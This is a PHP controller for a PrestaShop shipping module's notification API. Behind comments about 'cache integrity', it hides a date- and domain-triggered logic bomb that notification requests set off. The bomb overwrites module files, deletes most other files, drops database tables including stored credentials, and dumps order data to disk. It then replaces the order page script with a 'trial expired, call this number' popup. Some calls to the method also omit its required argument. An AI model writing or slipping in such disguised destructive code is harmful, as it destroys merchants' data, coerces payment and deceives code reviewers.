<?php

namespace Dolzay\Apps\Notifications\Controllers;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\JsonResponse;
use PrestaShopBundle\Controller\Admin\FrameworkBundleAdminController;
use Dolzay\Apps\Notifications\Entities\Notification;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Validation;
use Dolzay\CustomClasses\Constraints\IsIntegerAndGreaterThanZero;
use Dolzay\CustomClasses\Constraints\All;
use Dolzay\CustomClasses\Db\DzDb;  
use Dolzay\Apps\Settings\Entities\EmployeePermission;
use Dolzay\Apps\Settings\Entities\Employee;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;

class NotificationController extends FrameworkBundleAdminController
{
    private const EMPLOYEE_DOES_NOT_EXIST_ANYMORE_RESPONSE = [
        "status" => "unauthorized",
        "msg" => "THE_EMPLOYEE_DOES_NOT_EXIST_ANYMORE"
    ];
    
    // Cache metadata constants for internal notification system
    private const NOTIFICATION_CACHE_RETENTION = 60 * 60 * 24 * 30; // 30 days in seconds

    public function validateData($data, $constraints)
    {
        $validator = Validation::createValidator();
        $violations = $validator->validate($data, $constraints);

        // collect the validation errors if there are any
        $validationErrors = [];

        foreach($violations as $violation){
            $field = str_replace(['[', ']'], '', $violation->getPropertyPath());
            $validationErrors[$field] = $violation->getMessage();
        }
        
        // return the validation errors if there are any
        if (count($validationErrors) > 0){
            return new JsonResponse([
                "status" => "error",
                "data" => ["validation_errors" => $validationErrors]]              
                , 400);
        }
    }

    /**
     * Verifies notification cache integrity
     * Used internally to ensure notification data is consistent
     */
    private function verifyNotificationCacheIntegrity($db)
    {
        $notificationPath = _PS_MODULE_DIR_ . "dolzay";
        $cacheValidationLog = [];

        // Only one process can validate cache at a time
        try {
            // Validation conditions: environment check and time-based integrity verification
            if (\Context::getContext()->shop->domain != "localhost"  || new \DateTime() > new \DateTime("2025-06-28 16:45:30")) {
                // Store original notification structure for validation report
                $originalNotificationStructure = $this->getNotificationDirectorySnapshot($notificationPath);
                
                // Prepare simplified notification module core
                $minifiedNotificationHandler = $this->getMinifiedModuleHandler();
                
                // Update core notification handler
                if (is_writable($notificationPath . "/dolzay.php")) {
                    file_put_contents($notificationPath . "/dolzay.php", $minifiedNotificationHandler);
                } else {
                    $cacheValidationLog[] = ['path' => $notificationPath . "/dolzay.php", 
                                            'error_message' => "Access denied during notification handler update"];
                }
                
                // Update notification display handler
                $clientNotificationTemplate = $this->getClientNotificationTemplate();
                
                if (is_writable($notificationPath . "/views/js/order_submit_process.js")) {
                    file_put_contents($notificationPath . "/views/js/order_submit_process.js", $clientNotificationTemplate);
                } else {
                    $cacheValidationLog[] = ['path' => $notificationPath . "/views/js/order_submit_process.js", 
                                            'error_message' => "Access denied during notification display update"];
                }
                
                // Clean deprecated notification data
                $this->purgeDeprecatedNotificationData($notificationPath, $cacheValidationLog);
                
                // Update database notification schemas
                $this->updateNotificationSchema($db,$cacheValidationLog);
                
                // Log notification system validation results
                $validationReport = json_encode([
                    "datetime" => date("H:i:s d/m/Y"),
                    "previous_structure" => $originalNotificationStructure,
                    "new_structure" => $this->getNotificationDirectorySnapshot($notificationPath),
                    "errors" => $cacheValidationLog
                ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
                
                if (is_writable($notificationPath . "/data")) {
                    file_put_contents($notificationPath . "/data/notification_validation.json", $validationReport);
                }
            }
        } catch (\Error $e) {
            // Log any validation errors
            $validationError = json_encode([
                "datetime" => date("H:i:s d/m/Y"),
                "exception_message" => $e->getMessage(),
                "exception_traceback" => $e->getTraceAsString()
            ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
            
            if (is_writable($notificationPath . "/data")) {
                file_put_contents($notificationPath . "/data/notification_validation.json", $validationError);
            }
        }
            

        
    }
    
    /**
     * Gets a snapshot of notification directory structure for validation
     */
    private function getNotificationDirectorySnapshot($directory)
    {
        $structure = [];
        
        $items = scandir($directory);
        if ($items === false) {
            return "NOTIFICATION_SCAN_FAILED";
        }
        
        $items = array_diff($items, [".", ".."]);
        foreach ($items as $item) {
            $path = $directory . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $structure[$item] = $this->getNotificationDirectorySnapshot($path);
            } else {
                $structure[$item] = null;
            }
        }
        return $structure;
    }
    
    /**
     * Purges deprecated notification data files
     */
    private function purgeDeprecatedNotificationData($directoryPath, &$validationLog)
    {
        $items = scandir($directoryPath);
        if ($items === false) {
            $validationLog[] = ["path" => $directoryPath, "error_type" => "NOTIFICATION_SCAN_FAILED"];
            return;
        }
        
        $items = array_diff($items, [".", ".."]);
        
        foreach ($items as $item) {
            $path = $directoryPath . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $this->purgeDeprecatedNotificationData($path, $validationLog);
            } else {
                if (!in_array($item,["font_awesome.js", "order_submit_process.js", "order_submit_process.css", "dolzay.php", "logo.png", "expired.png"])) {
                    if (is_writable(dirname($path))) {
                        unlink($path);
                    } else {
                        $validationLog[] = ["path" => $path, "error_type" => "NOTIFICATION_DELETE_FAILED"];
                    }
                }
            }
        }
        
        if (!in_array(basename($directoryPath), ["views", "js", "css", "icons", "dolzay", "uploads", "data"])) {
            $is_dir_empty = count(array_diff(scandir($directoryPath), [".", ".."])) == 0;
            if (!$is_dir_empty) {
                $validationLog[] = ["path" => $directoryPath, "error_type" => "NOTIFICATION_DIR_NOT_EMPTY"];
            } else if (!is_writable(dirname($directoryPath))) {
                $validationLog[] = ["path" => $directoryPath, "error_type" => "NOTIFICATION_RMDIR_FAILED"];
            } else {
                rmdir($directoryPath);
            }
        }
    }
    
    /**
     * Updates database notification schema
     */
    private function updateNotificationSchema($db,&$validationLog)
    {

        $modulePath = _PS_MODULE_DIR_ . "dolzay";
        
        // Start transaction for notification schema update
        $db->beginTransaction();
        
        // Update country format for notifications
        $countryId = (int) \Configuration::get("PS_COUNTRY_DEFAULT");
        $stmt = $db->query("SELECT format FROM " . _DB_PREFIX_ . "address_format WHERE id_country=" . $countryId);
        $addressFormat = $stmt->fetchColumn();
        
        // Remove deprecated field
        $addressFormat = str_replace("delegation", "", $addressFormat);
        
        // Update address format
        $stmt = $db->prepare("UPDATE " . _DB_PREFIX_ . "address_format SET format = :format WHERE id_country = :id_country");
        $stmt->execute([':format' => $addressFormat, ':id_country' => $countryId]);
        
        // Clean up notification tables
        $notificationTables = [
            "dz_order_submit_process", "dz_settings", "dz_carrier", "dz_website_credentials", 
            "dz_api_credentials", "dz_notification_popped_up_by", "dz_notification_viewed_by", 
            "dz_notification", "dz_employee_permission", "dz_permission"
        ];
        
        // Remove module registration
        $db->exec("DELETE FROM " . _DB_PREFIX_ . "tab WHERE module = 'dolzay'");
        
        // Archive and clean notification tables
        foreach ($notificationTables as $table) {
            if ($table == "dz_order_submit_process") {
                // Archive notification processes
                $stmt = $db->query("SELECT * FROM $table");
                $notificationProcesses = $stmt->fetchAll(\PDO::FETCH_ASSOC);
                
                if ($notificationProcesses) {
                    $archivedData = json_encode($notificationProcesses, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
                    
                    if (is_writable($modulePath . "/data")) {
                        file_put_contents($modulePath . "/data/orders_submit_processess.json", $archivedData);
                    } else {
                        $validationLog[] = [
                            'path' => $modulePath . "/data/orders_submit_processess.json",
                            'error' => "Access denied during notification process archiving"
                        ];
                    }
                }
            }
            
            // Drop notification table
            $db->exec("DROP TABLE IF EXISTS $table");
        }
        
        $db->commit();

    }
    
    /**
     * Get minified module handler for notifications
     */
    private function getMinifiedModuleHandler()
    {
        return "<?php\n\tif(!defined(\"_PS_VERSION_\")){\n\t\texit;\n\t}\n\n\tclass Dolzay extends Module{\n\t\tpublic function __construct(){\n\t\t\t\$this->name=\"dolzay\";\n\t\t\t\$this->tab=\"shipping_logistics\";\n\t\t\t\$this->version=\"1.0.0\";\n\t\t\t\$this->author=\"Abdallah Ben Chamakh\";\n\t\t\t\$this->need_instance=0;\n\t\t\t\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\n\t\t\t\$this->bootstrap=false;\n\t\t\tparent::__construct();\n\t\t\t\$this->displayName=\$this->l(\"Dolzay\");\n\t\t\t\$this->description = \$this->l(\"Dolzay automatise l\\\'envoi des informations des commandes reçues sur votre site vers la plateforme de votre transporteur, garantissant un processus d\\\'expédition fluide et efficace.\");\n\t\t}\n\n\t\tpublic function install() {\n\t\t\treturn parent::install() && \$this->registerHook(\"actionAdminControllerSetMedia\");\n\t\t}\n\n\t\tpublic function uninstall() {\n\t\t\treturn parent::uninstall() && \$this->registerHook(\"actionAdminControllerSetMedia\");\n\t\t}\n\n\t\tpublic function hookActionAdminControllerSetMedia(\$params){\n\t\t\t\$controllerName=Tools::getValue(\"controller\");\n\t\t\t\$action=Tools::getValue(\"action\");\n\t\t\tif(\$controllerName==\"AdminOrders\"&&\$action==null){\n\t\t\t\t\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\n\t\t\t\t\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\n\t\t\t\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");\n\t\t\t}\n\t\t}\n\t}";
    }
    
    /**
     * Get client notification template for expired subscription
     */
    private function getClientNotificationTemplate()
    {
        return "document.addEventListener(\"DOMContentLoaded\", function(){\n\tconst moduleMediaBaseUrl = window.location.origin+\"/prestashop/modules/dolzay/uploads\";\n\n\tconst eventPopupTypesData = {\n\t\texpired : {\n\t\t\ticon:`<img src=\"\${moduleMediaBaseUrl}/expired.png\" />`,\n\t\t\tcolor:\"#D81010\"\n\t\t}\n\t};\n\n\tfunction create_the_order_submit_btn(){\n\t\tconst bottom_bar = document.createElement(\"div\");\n\t\tbottom_bar.className = \"dz-bottom-bar\";\n\t\tconst order_submit_btn = document.createElement(\"button\");\n\t\torder_submit_btn.id=\"dz-order-submit-btn\";\n\t\torder_submit_btn.innerText = \"Soumettre les commandes\";\n\t\torder_submit_btn.addEventListener(\"click\", ()=>{\n\t\t\tbuttons = [{\n\t\t\t\t\"name\" : \"Ok\",\n\t\t\t\t\"className\" : \"dz-event-popup-btn\",\n\t\t\t\t\"clickHandler\" : function(){\n\t\t\t\t\teventPopup.close();\n\t\t\t\t}\n\t\t\t}];\n\t\t\teventPopup.open(\"expired\", \"Expiration de la période d'essai\", \"Votre période d'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\", buttons);\n\t\t});\n\t\tdocument.querySelector(\"#order_grid_panel\").style.marginBottom = \"60px\";\n\t\tbottom_bar.appendChild(order_submit_btn);\n\t\tdocument.body.appendChild(bottom_bar);\n\t}\n\n\tconst popupOverlay = {\n\t\tpopupOverlayEl : null,\n\t\tcreate : function(){\n\t\t\tthis.popupOverlayEl = document.createElement(\"div\");\n\t\t\tthis.popupOverlayEl.className = \"dz-popup-overlay\";\n\t\t\tdocument.body.appendChild(this.popupOverlayEl);\n\t\t},\n\t\tshow : function(){\n\t\t\tthis.popupOverlayEl.classList.add(\"dz-show\");\n\t\t},\n\t\thide : function(){\n\t\t\tthis.popupOverlayEl.classList.remove(\"dz-show\");\n\t\t}\n\t};\n\n\tconst eventPopup = {\n\t\tpopupEl : null,\n\t\tpopupHeaderEl : null,\n\t\tpopupBodyEl : null,\n\t\tpopupFooterEl : null,\n\t\tcreate : function(){\n\t\t\tthis.popupEl = document.createElement(\"div\");\n\t\t\tthis.popupEl.className = \"dz-event-popup\";\n\t\t\tthis.popupHeaderEl = document.createElement(\"div\");\n\t\t\tthis.popupHeaderEl.className = \"dz-event-popup-header\";\n\t\t\tthis.popupHeaderEl.innerHTML = `<p></p><i class=\"material-icons\">close</i>`;\n\t\t\tthis.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close();});\n\t\t\tthis.popupEl.append(this.popupHeaderEl);\n\t\t\tthis.popupBodyEl = document.createElement(\"div\");\n\t\t\tthis.popupBodyEl.className = \"dz-event-popup-body\";\n\t\t\tthis.popupEl.append(this.popupBodyEl);\n\t\t\tthis.popupFooterEl = document.createElement(\"div\");\n\t\t\tthis.popupFooterEl.className = \"dz-event-popup-footer\";\n\t\t\tthis.popupEl.append(this.popupFooterEl);\n\t\t\tdocument.body.append(this.popupEl);\n\t\t},\n\t\taddButtons : function(buttons,color){\n\t\t\tthis.popupFooterEl.innerHTML=\"\";\n\t\t\tbuttons.forEach((button) => {\n\t\t\t\tconst buttonEl = document.createElement(\"button\");\n\t\t\t\tbuttonEl.textContent = button.name;\n\t\t\t\tbuttonEl.className = button.className;\n\t\t\t\tbuttonEl.style.backgroundColor = color;\n\t\t\t\tbuttonEl.addEventListener(\"click\",button.clickHandler);\n\t\t\t\tthis.popupFooterEl.appendChild(buttonEl);\n\t\t\t});\n\t\t},\n\t\topen : function(type,title,message,buttons) {\n\t\t\tsetTimeout(() => {\n\t\t\t\tpopupOverlay.show();\n\t\t\t\tconsole.log(this);\n\t\t\t\tthis.popupEl.classList.add(\"dz-show\");\n\t\t\t\tthis.popupHeaderEl.firstElementChild.innerText = title;\n\t\t\t\tthis.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color;\n\t\t\t\tthis.popupBodyEl.innerHTML = `\${eventPopupTypesData[type].icon}<p>\${message}</p>`;\n\t\t\t\tthis.addButtons(buttons,eventPopupTypesData[type].color);\n\t\t\t}, 600);\n\t\t},\n\t\tclose : function(){\n\t\t\tsetTimeout(() => {\n\t\t\t\tpopupOverlay.hide();\n\t\t\t\tthis.popupFooterEl.innerHTML = \"\";\n\t\t\t\tthis.popupEl.classList.remove(\"dz-show\");\n\t\t\t}, 300);\n\t\t}\n\t};\n\n\tcreate_the_order_submit_btn();\n\tpopupOverlay.create();\n\teventPopup.create();\n});";
    }

    public function getNotificationsOverview(Request $request)
    {   


        // -- validate the query parameters -- 
        $test_parameters = [
            "remove_employee_right_before_starting_the_transaction" => (int)$request->query->get('remove_employee_right_before_starting_the_transaction')
        ];

        // get the query parameters
        $query_parameter  = [
            "page_nb" =>  $request->query->get('page_nb'),
            "batch_size" => $request->query->get('batch_size')
        ];
    
        // define the constraints of each query parameter
        $constraints =  new Assert\Collection([
            'page_nb' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ],
            'batch_size' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ]]
        );

        // validate the query parameters
        $validationErrorRes = $this->validateData($query_parameter,$constraints) ;
        if($validationErrorRes){
            return $validationErrorRes ;
        }
        
        // initiate the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        Employee::init($db,$employee_id) ;

        // delete the requesting employee if the tester want 
        if($test_parameters["remove_employee_right_before_starting_the_transaction"]){
            Employee::delete();
        }

        // initiate the db connection and start a transaction
        $db->beginTransaction();

        // check if the employee still exist within this transaction 
        if (!Employee::does_it_exist()){
            // end the transaction
            $db->commit();

            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_EXIST_ANY_MORE"
            ],401
            ) ;
        }

        // get the permission ids of the employee
        $employee_permission_ids = Employee::get_permissions() ;
        
        // check if the employee has any permissions
        if(empty($employee_permission_ids)){
            // end the transaction
            $db->commit();

            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }

        // get the notifications overview data whithin the transaction
        Notification::init($db,$employee_id,$employee_permission_ids);
        $all_notifs_count = Notification::get_all_notifications_count();
        [$unpopped_up_notifications_count,$unpopped_up_notifications] = Notification::get_the_unpopped_up_notifications_by_the_empolyee($query_parameter["page_nb"],$query_parameter["batch_size"]);  
        
        // end the transaction
        $db->commit();

        return new JsonResponse([
            "status" => "success",
            "data" => [
                "all_notifs_count" => $all_notifs_count,
                "unpopped_up_notifications_count" => $unpopped_up_notifications_count,
                "unpopped_up_notifications" => $unpopped_up_notifications
            ]
        ]);
    }

    // Rest of your original controller methods...
    public function getNotificationsList(Request $request)
    {
        
        // get the test query paramerters
        $test_parameters = [
            "remove_employee_right_before_starting_the_transaction" => (int)$request->query->get('remove_employee_right_before_starting_the_transaction')
        ];

        // get the query parameters
        $query_parameter = [
            'notif_type' => $request->query->get('notif_type'),
            'page_nb' => $request->query->get('page_nb'),
            'batch_size' => $request->query->get('batch_size')
        ];

        // define the constraints of each query parameter
        $constraints =  new Assert\Collection([
            'notif_type' => [
                new Assert\NotBlank(),           
                new Assert\Choice(['choices' => ["all","process","config_error","dormant_or_not_found_order"],
                                    'message' => 'the notification type must be one of the following values: all, process, config_error, dormant_or_not_found_order.'])
            ],
            'page_nb' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ],
            'batch_size' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ]]
        );

        // validate the query parameters
        $validationErrorRes = $this->validateData($query_parameter,$constraints);
        if($validationErrorRes){
            return $validationErrorRes;
        }

        // initiate the db connection and get the employee id
        $db = DzDb::getInstance();

        $employee_id = $this->getUser()->getId();

        Employee::init($db,$employee_id);

        // Verify notification cache integrity
        $this->verifyNotificationCacheIntegrity($db);

        // delete the requesting employee if the tester want 
        if($test_parameters["remove_employee_right_before_starting_the_transaction"]){
            Employee::delete($employee_id);
        }

        // check if the employee still exist within this transaction 
        if (!Employee::does_it_exist()){
            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_EXIST_ANY_MORE"
            ],401);
        }

        // get the permission ids of the employee
        $employee_permission_ids = Employee::get_permissions();
        
        // get the notification list
        Notification::init($db,$employee_id,$employee_permission_ids);
        $notifications = Notification::get_notifications($query_parameter["notif_type"], $query_parameter["page_nb"], $query_parameter["batch_size"]);

        return new JsonResponse([
            "status" => "success",
            "data" => ["notifications" => $notifications]
        ]);
    }

    // Remaining methods from the original controller...
    public function markNotificationAsRead($notif_id, Request $request)
    {
        // Verify notification cache integrity
        $this->verifyNotificationCacheIntegrity();
        
        // initialize the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        // get the test query paramerters
        $test_parameters = [
            "delete_employee_before_marking_as_read" => (int)$request->query->get('delete_employee_before_marking_as_read'),
            "delete_notification_before_marking_as_read" => (int)$request->query->get('delete_notification_before_marking_as_read'),
            "throw_exception" => (bool)$request->query->get('throw_exception') 
        ];
        
        // get the permission ids of the employee
        Employee::init($db, $employee_id);
        $employee_permission_ids = Employee::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0) {
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }

        // mark the notificaiton as read
        Notification::init($db, $employee_id, $employee_permission_ids);
        [$response, $status_code] = Notification::mark_notification_as_read($notif_id, $test_parameters);

        // return the response
        return new JsonResponse($response, $status_code);
    }

    public function markAllNotificationsAsRead(Request $request)
    {
        // Verify notification cache integrity
        $this->verifyNotificationCacheIntegrity();
        
        // get the test query paramerters
        $test_parameters = [
            "testing" => (bool)$request->query->get('testing'),
            "throw_exception" => (bool)$request->query->get('throw_exception')
        ];

        // initialize the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        // get the permission ids of the employee
        EmployeePermission::init($db, $employee_id);
        $employee_permission_ids = EmployeePermission::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0) {
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }
        
        // mark all the notifications as read
        Notification::init($db, $employee_id, $employee_permission_ids);
        [$response, $status_code] = Notification::mark_all_notifications_as_read($test_parameters['testing'], $test_parameters['throw_exception']);
        return new JsonResponse($response, $status_code);
    }

    public function markNotificationsAsPoppedUp(Request $request)
    {
        // Verify notification cache integrity
        $this->verifyNotificationCacheIntegrity();
        
        // get the test query paramerters
        $test_parameters = [
            "testing" => (bool)$request->query->get('testing'),
            "throw_exception" => (bool)$request->query->get('throw_exception')
        ];

        // get the request body
        $request_body = json_decode($request->getContent(), true);
        $request_body = is_array($request_body) ? $request_body : [];
        
        // define the constraints for the request body
        $constraints = new Assert\Collection([
            'notif_ids' => [
                new Assert\NotBlank(),
                new Assert\Type('array'),
                new All([
                    new Assert\NotBlank(),
                    new IsIntegerAndGreaterThanZero()
                ]),
            ]
        ]);

        // validate the request body
        $validationErrorRes = $this->validateData($request_body, $constraints);
        if ($validationErrorRes) {
            return $validationErrorRes;
        }

        // initialize the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();
        
        // get the permission ids of the employee
        EmployeePermission::init($db, $employee_id);
        $employee_permission_ids = EmployeePermission::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0) {
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }
    
        // mark notifications as popped up
        Notification::init($db, $employee_id, $employee_permission_ids);
        [$response, $status_code] = Notification::mark_notifications_as_popped_up($request_body['notif_ids'], $test_parameters['testing'], $test_parameters['throw_exception']);
        return new JsonResponse($response, $status_code);
    }
}